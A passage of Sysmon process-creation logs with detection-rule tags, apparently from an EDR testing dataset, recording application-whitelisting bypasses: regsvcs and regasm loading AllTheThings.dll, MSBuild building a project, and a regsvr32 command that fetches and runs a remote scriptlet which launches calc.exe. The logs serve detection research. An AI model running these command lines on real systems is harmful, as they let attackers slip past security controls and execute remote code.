RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 1296
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6628-5D3F-0000-001067768800
CommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:28.197
"
2019-07-29T21:33:28.374373+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4917,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 2040
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6628-5D3F-0000-001062788800
CommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:28.222
"
2019-07-29T21:33:29.341503+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4918,MSEDGEWIN10,"Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
RuleName: ''
Description: Microsoft .NET Services Installation Utility
TerminalSessionId: 1
ParentCommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 1296
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=7D163D3FA313FC69F2510168EFC1240993AAF7D2,MD5=D15EF1C50607B320C31B5697AD126660,SHA256=549CBF63163B33A1CAD7703D4C8A1EF66EEDFFF249A7ECB181C5D2BD78DA2899,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid: 747F3D96-6628-5D3F-0000-001067768800
ProcessId: 4860
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6628-5D3F-0000-00105B918800
CommandLine: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe  AllTheThings.dll
FileVersion: '4.7.3190.0 built by: NET472REL1LAST_C'
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:28.618
"
2019-07-29T21:33:29.565736+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4919,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 5708
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6628-5D3F-0000-0010B1968800
CommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:28.756
"
2019-07-29T21:33:29.646278+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4920,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6552
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6628-5D3F-0000-0010349B8800
CommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:28.893
"
2019-07-29T21:33:30.074656+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4921,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 4564
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6629-5D3F-0000-0010C0BE8800
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:29.726
"
2019-07-29T21:33:34.295068+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4922,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6020
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-662E-5D3F-0000-001011038900
CommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:34.216
"
2019-07-29T21:33:34.411034+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4923,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 1976
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-662E-5D3F-0000-0010C2048900
CommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:34.234
"
2019-07-29T21:33:34.483714+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4924,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 2604
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-662E-5D3F-0000-001054068900
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:34.252
"
2019-07-29T21:33:39.312305+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4925,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 4092
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6633-5D3F-0000-001051608900
CommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:39.152
"
2019-07-29T21:33:39.358048+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4926,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 5056
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6633-5D3F-0000-001092628900
CommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:39.223
"
2019-07-29T21:33:39.372599+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4927,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 5256
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6633-5D3F-0000-0010F0638900
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:39.252
"
2019-07-29T21:33:39.907321+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4928,MSEDGEWIN10,"Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
RuleName: ''
Description: Microsoft .NET Assembly Registration Utility
TerminalSessionId: 1
ParentCommandLine: cmd  /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 4092
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=A580AF099F754953480323F6369E5534261F082E,MD5=E99BD2E860B0D73E55708200A600DA35,SHA256=CD5FBB0AC9EBBD64AE84624D428CE30FF17FD586F71F8C5580BC57B176E6716B,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid: 747F3D96-6633-5D3F-0000-001051608900
ProcessId: 3512
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6633-5D3F-0000-0010D9778900
CommandLine: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe  /U AllTheThings.dll
FileVersion: '4.7.3190.0 built by: NET472REL1LAST_C'
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:39.751
"
2019-07-29T21:33:44.268287+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4929,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 1652
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6638-5D3F-0000-00103DA88900
CommandLine: cmd  /c regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:44.204
"
2019-07-29T21:33:44.287385+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4930,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 4632
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6638-5D3F-0000-001022AA8900
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:44.229
"
2019-07-29T21:33:44.641177+00:00,Hacktool - EDR-Freeze Execution;Potentially Suspicious Regsvr32 HTTP/FTP Pattern;Scripting/CommandLine Process Spawned Regsvr32;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4931,MSEDGEWIN10,"Image: C:\Windows\System32\regsvr32.exe
RuleName: ''
Description: Microsoft(C) Register Server
TerminalSessionId: 1
ParentCommandLine: cmd  /c regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1652
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=FC99212A5F929D707AF49E8151CAB1E30FF658EB,MD5=DA0E9A7777D16AE18BD9C642A9F42223,SHA256=F098FA150D9199732B4EC2E81528A951503A30F75AFEBF7E7A48360301758C67,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F
ParentProcessGuid: 747F3D96-6638-5D3F-0000-00103DA88900
ProcessId: 4288
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6638-5D3F-0000-001067BA8900
CommandLine: regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:44.622
"
2019-07-29T21:33:45.581170+00:00,Hacktool - EDR-Freeze Execution;Potentially Suspicious Child Process Of Regsvr32;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4933,MSEDGEWIN10,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4288
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=F5ED372FD8EC7C455FF66BCE73F16CA51CBC0302,MD5=DEAD69D07BC33B762ABD466FB6F53E11,SHA256=3091E2ABFB55D05D6284B6C4B058B62C8C28AFC1D883B699E9A2B5482EC6FD51,IMPHASH=8EEAA9499666119D13B3F44ECD77A729
ParentProcessGuid: 747F3D96-6638-5D3F-0000-001067BA8900
ProcessId: 208
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6639-5D3F-0000-001074F48900
CommandLine: '""C:\Windows\System32\calc.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\regsvr32.exe
UtcTime: 2019-07-29 21:33:45.332
"
2019-07-29T21:33:49.748805+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4936,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 3240
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-663D-5D3F-0000-00106F608A00
CommandLine: cmd  /c C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:49.535
"
2019-07-29T21:33:49.889688+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4937,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 4184
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-663D-5D3F-0000-001074658A00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:49.640
"
